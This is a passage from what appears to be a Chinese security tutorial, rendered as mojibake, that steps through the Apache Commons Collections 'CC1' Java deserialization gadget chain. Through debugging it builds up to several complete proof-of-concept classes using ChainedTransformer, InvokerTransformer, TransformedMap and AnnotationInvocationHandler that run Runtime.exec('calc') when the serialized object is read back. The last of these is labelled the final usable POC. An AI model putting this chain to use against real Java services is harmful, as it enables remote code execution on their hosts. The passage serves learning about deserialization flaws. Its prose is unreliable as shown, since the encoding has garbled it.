1.ç„¶åç°åœ¨å°±æ˜¯è°ƒç”¨çš„ä¼ å…¥çš„æ•°ç»„ç¬¬ä¸€ä¸ªå‚æ•°çš„transformæ–¹æ³•ï¼Œå³ConstantTransformerç±»çš„transform()æ–¹æ³•ï¼ˆæ­¤æ—¶çš„objectä¸º10ï¼‰ï¼š\nè¿™é‡Œçš„transformæ–¹æ³•ä¼šç›´æ¥è¿”å›æˆ‘ä»¬å®ä¾‹åŒ–æ—¶å®šä¹‰çš„Runtime.classï¼Œæ‰€ä»¥è¿™é‡Œçš„10æœ€ç»ˆæ˜¯æ²¡ç”¨çš„ï¼Œè¿™æ­¥è¿‡åobjectçš„å€¼å˜ä¸ºäº†Runtimeå¯¹è±¡ï¼Œå³class java.lang.Runtimeã€‚\n2.ç„¶åç°åœ¨è°ƒç”¨çš„å°±æ˜¯æ•°ç»„ç¬¬äºŒä¸ªå€¼çš„ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯\n1 new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}) ç»§ç»­è·Ÿè¿›\næ³¨æ„çœ‹input.getClass()è¿™ä¸€æ­¥è¿‡åçš„clsçš„å€¼ï¼Œå±…ç„¶å˜æˆäº†Classå¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¼€å§‹æ²¡æƒ³é€šçš„ï¼ˆè¿™é‡Œçš„Inputä¸æ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¯¹ä»»ä½•ç±»çš„classå¯¹è±¡ä½¿ç”¨getClass()æ–¹æ³•æ—¶éƒ½ä¼šè¿”å›class java.lang.Classã€‚\nç„¶åè¿™é‡Œè°ƒç”¨getMethod()æ–¹æ³•è·å–Classå¯¹è±¡çš„getMethod()æ–¹æ³•å¹¶åœ¨returnçš„åœ°æ–¹ä½¿ç”¨invoke()æ–¹æ³•æ¥è·å–Runtimeç±»çš„getRuntime()æ–¹æ³•ï¼ˆgetRuntimeæ–¹æ³•ä¸ºé™æ€æ–¹æ³•ï¼‰\næ‰€ä»¥ç°åœ¨çš„objectå˜ä¸ºRuntimeé‡Œé¢çš„getRuntime()æ–¹æ³•ã€‚\n3.ç»§ç»­ï¼Œç°åœ¨åˆ°äº†ç¬¬ä¸‰ä¸ªå€¼çš„ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ï¼š\n1 new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}) è¿˜æ˜¯è¿›å…¥InvokerTransformerç±»çš„transformæ–¹æ³•\nè¿™é‡Œéœ€è¦æ³¨æ„çš„åŒæ ·çš„æ˜¯getClass()é‚£é‡Œï¼Œç”±äºæˆ‘ä¼ å…¥çš„æ˜¯ä¸€ä¸ªgetRuntime()æ–¹æ³•çš„classå¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè¿”å›çš„æ˜¯class java.lang,reflect.Methodï¼Œç„¶åä½¿ç”¨åå°„è·å–Methodç±»ä¸­çš„invokeæ–¹æ³•ï¼Œæœ€åå†åœ¨returnéƒ¨åˆ†è°ƒç”¨invokeæ–¹æ³•æ¥åˆ©ç”¨åå°„è·å–çš„invoke()æ–¹æ³•ï¼Œå½¢å¦‚ï¼š\n1 2 3 4 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //è¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰§è¡Œæ–¹æ³•ä»è€Œè·å–Runtimeç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿˜æ˜¯å’Œè¿™ä¸ªæ–¹æ³•æ˜¯staticæœ‰å…³ æ‰€ä»¥åœ¨è¿™é‡Œåº”è¯¥å°±æ˜¯ç›¸å½“äºç›´æ¥æ‰§è¡ŒgetRuntime()æ–¹æ³•ï¼ˆæ³¨æ„ç†è§£å¯¹æ¯”åå°„çš„çŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œçš„çš„ç”¨æ³•éœ€è¦ç†è§£è®°å¿†ï¼‰\næ‰€ä»¥åœ¨è¿™ä¸€æ­¥åå¯ä»¥è·å–åˆ°new Runtimeçš„å®ä¾‹ã€‚\nå³ç°åœ¨çš„objectçš„å€¼ä¸ºRuntimeç±»çš„å®ä¾‹\n4.ç°åœ¨å°±åˆ°äº†æ•°ç»„çš„æœ€åä¸€ä¸ªå€¼ï¼Œå³ï¼š\n1 new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) ç„¶ååé¢å°±æ˜¯è·å–Runtimeç±»çš„execæ–¹æ³•ï¼Œå¹¶åœ¨invokeæ—¶ä¼ å…¥calcå¼¹å‡ºè®¡ç®—æœºã€‚\n5.æ€»ç»“\næœ€åç®€å•æ€»ç»“ä¸€ä¸‹chainé“¾ä¸­çš„æµç¨‹ï¼š\nä½¿ç”¨ConstantTransformerçš„transformæ–¹æ³•è¿”å›Runtime.class å†åœ¨InvokerTransformerçš„transformæ–¹æ³•è·å–getMethodæ–¹æ³•å¹¶åˆ©ç”¨è·å–getRuntime()æ–¹æ³• å†åœ¨InvokerTransformerçš„transformä¸­è·å–invokeæ–¹æ³•æ¥è°ƒç”¨getRuntime()æ–¹æ³•ä»è€Œè·å–åˆ°Runtimeç±»å®ä¾‹ã€‚ æœ€åè¿˜æ˜¯åœ¨InvokerTransformerçš„transformæ–¹æ³•è·å–åˆ°execæ–¹æ³•å¹¶ä¼ å…¥calcå¼¹å‡ºè®¡ç®—æœº åˆ†æç»“æŸã€‚\nå…¶å®è¿˜å¯ä»¥æ›´ç®€å•ï¼Œç»“åˆgetRuntime()æ–¹æ³•çš„ç‰¹æ€§ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; class Test{ public static void main(String[] args){ ChainedTransformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer(\u0026#34;exec\u0026#34; , new Class[]{ String.class },new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map ctf =TransformedMap.decorate(hashMap,chain,null); ctf.put(10,\u0026#34;xxx\u0026#34;); } } åŒæ ·æˆåŠŸå¼¹å‡ºè®¡ç®—æœº\nç»¼ä¸Šç¬¬äºŒç§çš„ç®€åŒ–ä»£ç æ›´ç®€æ´ï¼Œç¬¬ä¸€ç§åæŠ€å·§æ€§ï¼Œéƒ½è¦ç†è§£å­¦ä¹ åˆ©ç”¨ã€‚\nä½†æ˜¯ç¬¬äºŒç§ä»£ç æœ¬èº«åœ¨å…·ä½“çš„è¿ç”¨ä¸­å¹¶æ²¡æœ‰ç”¨ï¼Œè¿™æ˜¯å› ä¸ºRuntimeç±»å¹¶æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œè€Œè§£å†³æ–¹æ³•å°±æ˜¯ç¬¬ä¸€ç§ï¼Œæ‰€ä»¥åœ¨å®é™…è¿ç”¨ä¸­è¿˜æ˜¯ä½¿ç”¨çš„ç¬¬ä¸€ç§ã€‚\nå®é™…åˆ©ç”¨ ä¸Šé¢çš„ä»£ç åªæ˜¯ä¸€ä¸ªç”¨æ¥åœ¨æœ¬åœ°æµ‹è¯•çš„ç±»ï¼Œå¹¶ä¸”æ˜¯æˆ‘ä»¬é€šè¿‡æ„é€ ä»£ç æ¥å¯ç”¨ç¬¬ä¸€ä¸ªtransform()æ–¹æ³•ç»§è€Œå®ç°çš„é“¾å­ã€‚åœ¨å®é™…ååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å®ƒçš„readObjectä»£ç é€»è¾‘ä¸­æœ‰ç±»ä¼¼Map.putæ–¹æ³•çš„æ“ä½œã€‚\nåœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨åˆ°çš„ç±»å°±æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerã€‚\nç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„readObject()æ–¹æ³•ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯8u71ä»¥å‰çš„ä»£ç ï¼Œ8u71ä»¥ååšäº†ä¸€äº›ä¿®æ”¹ï¼Œè¿™ä¸ªåé¢å†è¯´ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } é‡ç‚¹å…³æ³¨foreachè¯­å¥ã€‚åœ¨è¿™é‡ŒMap.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()ç”¨äºéå†Mapï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼Œè€ŒString name = memberValue.getKey();è¯­å¥å’ŒObject value = memberValue.getValue();è¯­å¥ç”¨äºè·å–é”®å€¼å¯¹ã€‚\nè¿™é‡Œçš„é‡ç‚¹å°±æ˜¯è¿™ä¸ªsetValue()æ–¹æ³•äº†ï¼Œè¿™é‡Œç®€å•ç»™å‡ºè¿™ä¸ªè°ƒç”¨é“¾ï¼š\n1 AnnotationInvocationHandler#readObject() ==\u0026gt; AbstractInputCheckedMapDecorator$MapEntry#setValue() ==\u0026gt;TransformedMap#checkSetValue åœ¨TransformedMapè¿™é‡Œå°±å¯ä»¥å¯åŠ¨å‰é¢æ„é€ çš„è°ƒç”¨é“¾\nåŒæ—¶åœ¨è¿™é‡Œå¯ä»¥çœ‹å‡ºæ˜¯åˆ©ç”¨çš„valueTransformerï¼Œæ‰€ä»¥åœ¨è°ƒç”¨decorate()æ–¹æ³•åˆå§‹åŒ–æ—¶è¦ä¸åŒäºå‰é¢çš„åŸºæœ¬ä»£ç ï¼Œéœ€è¦æ”¹ä½ç½®ï¼Œå¦‚ä¸‹ï¼š\n1 Map map2 = TransformedMap.decorate(hashMap,null,chain); è¿™æ ·æ‰èƒ½ä¿è¯æˆåŠŸè°ƒç”¨ã€‚ç°åœ¨å°±å›´ç»•è¿™æ¡é“¾å­æ¥è¿›è¡Œé˜è¿°ã€‚\n1.ç°åœ¨æ¥çœ‹memberValuesçš„èµ‹å€¼ç‚¹ï¼š\nè¿™é‡Œç”±äºAnnotationInvacationHandlerå±jdkå†…éƒ¨ç±»ï¼Œæ— æ³•ç›´æ¥å¼•ç”¨ä¸”è¢«å®ä¾‹åŒ–ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨åå°„è·å–æ„é€ æ–¹æ³•ï¼Œå°†ä¿®é¥°è¿‡çš„Mapæ·»åŠ è¿›å»ã€‚\næ³¨æ„çœ‹AnnotationInvacationHandlerçš„æ„é€ æ–¹æ³•ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹å‚æ•°é—®é¢˜ï¼š\nå¯¹äºç¬¬ä¸€ä¸ªå‚æ•°Class\u0026lt;? extends Annotation\u0026gt; typeï¼Œç®€å•è¯´æ˜ä¸€ä¸‹ï¼šå½¢å¦‚**\u0026lt;ï¼Ÿ extends Collection\u0026gt;** è¿™é‡Œ**ï¼Ÿä»£è¡¨ä¸€ä¸ªæœªçŸ¥çš„ç±»å‹ï¼Œä½†æ˜¯ï¼Œè¿™ä¸ªæœªçŸ¥çš„ç±»å‹å®é™…ä¸Šæ˜¯Collection**çš„ä¸€ä¸ªå­ç±»ï¼ŒCollectionæ˜¯è¿™ä¸ªé€šé…ç¬¦çš„ä¸Šé™ã€‚\nåŒæ—¶çœ‹è¿™ä¸ªæ„é€ æ–¹æ³•é‡Œé¢çš„ if è¯­å¥ä»£ç ï¼Œè¿™é‡Œåªè¦æ»¡è¶³ä»»ä½•ä¸€ä¸ªæ¡ä»¶å°±ä¼šè¿›å…¥åˆ°ifè¯­å¥ï¼Œå¯¼è‡´ä¸èƒ½æ­£å¸¸èµ‹å€¼ã€‚è¿™é‡Œé‡ç‚¹å…³æ³¨!type.isAnnotation()ä»£ç ï¼Œè¿™é‡Œçš„isAnnotation()å‡½æ•°å°±æ˜¯ç”¨æ¥åˆ¤æ–­Classå¯¹è±¡æ˜¯å¦æ˜¯è¡¨ç¤ºä¸€ä¸ªæ³¨è§£ç±»å‹ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ä¸€ä¸ªä¼ å…¥ä¸€ä¸ªæ³¨è§£ç±»å‹çš„Annotationã€‚ä¹Ÿå°±æ˜¯ä¸‹å›¾ä¸­æœ‰@çš„ç±»ï¼š\né€‰æ‹©ä¸Šé¢çš„ä»»æ„ä¸€ä¸ªæ³¨è§£ç±»å‹çš„ç±»åº”è¯¥éƒ½æ˜¯å¯ä»¥çš„\næ‰€ä»¥å¯ä»¥æ„é€ ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 Class clazz = Clas.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDelaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); constructor1.newInstance(Rention.class,ctf); //ctfå³æ„é€ å¥½çš„TransformedMap ç°åœ¨è§£å†³äº†memberValueså€¼çš„é—®é¢˜ã€‚\n2.ç»§ç»­çœ‹readObject()æ–¹æ³•çš„æºç \nä¸ºäº†æ–¹ä¾¿å­¦ä¹ ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥æ‹¼æ¥ä¸€ä¸‹å‰é¢çš„æ€»ç»“å‡ºæ¥çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //åºåˆ—åŒ– serialize(o); //ååºåˆ—åŒ– unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } å†æ‰“æ–­ç‚¹è°ƒè¯•å‘ç°æ˜¯åœ¨readObject()åœ°æ–¹å‡ºç°é—®é¢˜ï¼Œç°åœ¨æ¥è·Ÿä¸€ä¸‹readObject()çš„æºç ï¼Œæ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nå…ˆæ¥çœ‹è¿™ä¸¤ä¸²ä»£ç ï¼š\n1 2 3 annotationType = AnnotationType.getInstance(type); å’Œ Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); ç®€å•çœ‹çœ‹ç»“æœï¼š\nç¬¬ä¸€è¡Œä»£ç å°†annotationTypeè¢«èµ‹å€¼ä¸ºäº†AnnotationTypeå®ä¾‹ï¼Œæ‰€ä»¥ç¬¬äºŒè¡Œä»£ç å°±ä¼šè°ƒç”¨AnnotationTypeç±»çš„memberTypes()æ–¹æ³•:\næ‰€ä»¥æœ€ç»ˆreadObject()æ–¹æ³•é‡Œé¢çš„memberTypesä¸ºHashMapç±»çš„å®ä¾‹ã€‚\nè¿™é‡Œè¿˜è¦è¯´æ˜ä¸€ä¸ªç‚¹ï¼Œå…³äºfor (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet())è¿™ä¸ªå¾ªç¯éå†çš„ä»£ç é—®é¢˜ï¼Œåœ¨æ‰“æ–­ç‚¹è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°å¦‚ä¸‹æ‰“æ–­ç‚¹ä¼šç›´æ¥ç»“æŸï¼š\né‚£å°±è¯´æ˜åœ¨æˆ‘ä¸Šé¢æ‹¼æ¥çš„ä»£ç åœ¨ååºçš„æ—¶å€™å¹¶æ²¡æœ‰æˆåŠŸè¿›å…¥åˆ°è¿™ä¸ªforè¯­å¥ä¸­ï¼Œæˆ‘çŒœæµ‹æ˜¯è¿™ä¸ªå¾ªç¯éå†çš„é—®é¢˜ï¼Œå»æŸ¥çœ‹å‰é¢ç»™çš„æ–‡ç« çš„ä¸¾ä¾‹ä»£ç ï¼Œç›´æ¥çœ‹æµ‹è¯•ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(1, \u0026#34;value1\u0026#34;); map.put(2, \u0026#34;value2\u0026#34;); map.put(3, \u0026#34;value3\u0026#34;); map.put(4, \u0026#34;value4\u0026#34;); map.put(5, \u0026#34;value5\u0026#34;); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;æˆåŠŸè¿›å…¥å¾ªç¯éå†\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } æˆåŠŸè¾“å‡º\nä½†æ˜¯å½“æˆ‘ä½¿ç”¨å¦‚ä¸‹ä»£ç æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;æˆåŠŸè¿›å…¥å¾ªç¯éå†\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } å´ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œè¿™ä¸ªç»“æœé‚£å°±ç¡®å®è¯´æ˜äº†*æˆ‘ä»¬éœ€è¦å‘Mapä¸­é”®å…¥è‡³å°‘ä¸€å¯¹é”®å€¼å¯¹æ‰èƒ½æˆåŠŸè¿›å…¥åˆ°è¿™ä¸ªforå¾ªç¯ã€‚*åç»­æœ‰ä¸ªé—®é¢˜ï¼Œç›´æ¥è®²äº†ï¼š\nè¿™é‡Œçœ‹readObject()æºç ï¼Œå¯ä»¥çŸ¥é“éœ€è¦å°†è¿™ä¸ªå€¼è®¾ç½®ä¸ºStringé‚£ä¹ˆæµ‹è¯•ä»£ç å°±å¯ä»¥æ”¹æˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;ceshi\u0026#34;,\u0026#34;value1\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //åºåˆ—åŒ– serialize(o); //ååºåˆ—åŒ– unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } å†è°ƒè¯•æˆåŠŸè¿›å…¥forå¾ªç¯ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œé‚£ä¹ˆç»§ç»­æ‰“æ–­ç‚¹ï¼Œå¦‚ä¸‹æ‰“æ–­ç‚¹æ—¶ä¼šç›´æ¥é€€å‡º\nè¯´æ˜å¹¶æ²¡æœ‰è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œé‚£ä¹ˆç°åœ¨é‡ç‚¹å…³æ³¨memberTypeçš„èµ‹å€¼è¯­å¥ï¼š\nå†åœ¨ifè¯­å¥æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œæ­¤æ—¶å€¼çš„æƒ…å†µä¸ºï¼š\né‚£ä¹ˆç°åœ¨çœ‹ä¸€ä¸‹è¿™ä¸ªè°ƒç”¨çš„getæ–¹æ³•ï¼Œå‰é¢å·²ç»è¯´è¿‡äº†memberTypesä¸ºHashMapç±»å®ä¾‹ï¼Œé‚£ç°åœ¨å°±çœ‹HashMapç±»çš„getæ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 public V get(Object key) { Node\u0026lt;K,V\u0026gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } é‚£ç°åœ¨å†å¦‚ä¸‹æ‰“æ–­ç‚¹ï¼š\nè°ƒè¯•è·Ÿè¿›ï¼Œå‘ç°æœ€ç»ˆå…¶ä½œç”¨çš„ç‚¹å°±æ˜¯getNode()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåœ¨å“ˆå¸Œè¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå¦‚æœç›¸åŒ¹é…å°±ä¼šè¿”å›å¯¹åº”çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚å¦‚æœåŒ¹é…åˆ°æˆ‘è®¾ç½®çš„ceshié”®å’Œå€¼value1ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›å¯¹åº”èŠ‚ç‚¹ï¼Œå¦åˆ™å°±ä¼šè¿”å›nullã€‚\nåç»­çš„å¦‚ä½•åŒ¹é…å°±æ˜¯æ³¨é‡Šç›¸å…³æŠ€æœ¯äº†ï¼Œåœ¨è¿™é‡Œæƒ³è¦æˆåŠŸé€šè¿‡çš„æ¡ä»¶ä¸ºï¼š\nsun.reflect.annotation.AnnotationInvocationHandleræ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯Annotationçš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åæ˜¯X é‚£ä¹ˆè¢«TransformedMap.decorateä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´  æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†é”®è®¾ç½®ä¸ºvalueï¼Œå› ä¸ºæ³¨è§£ç±»æœ‰åä¸ºvalueçš„æ–¹æ³•ï¼š æ‰€ä»¥æœ€ç»ˆçš„å¯åˆ©ç”¨çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxx\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //åºåˆ—åŒ– serialize(o); //ååºåˆ—åŒ– unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } æˆå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚\nç°åœ¨æ¥çœ‹ä¸€ä¸‹setValue()æ–¹æ³•åç»­è°ƒç”¨çš„æ–¹æ³•çš„æºç ï¼š\nç„¶åå°±æ˜¯TransformedMapç±»çš„checkSetValue()æ–¹æ³•ï¼š ç”±äºæˆ‘ä»¬å‰é¢å°±å°†valueTransformerè®¾ç½®ä¸ºäº†chainé“¾ï¼Œæ‰€ä»¥åç»­éƒ½ä¼šå¾€é¢„ä¼°æ–¹å‘å‘å±•ï¼Œå…·ä½“è¿‡ç¨‹å¯ä»¥å‚è€ƒå‰é¢çš„åŸºç¡€ä»£ç 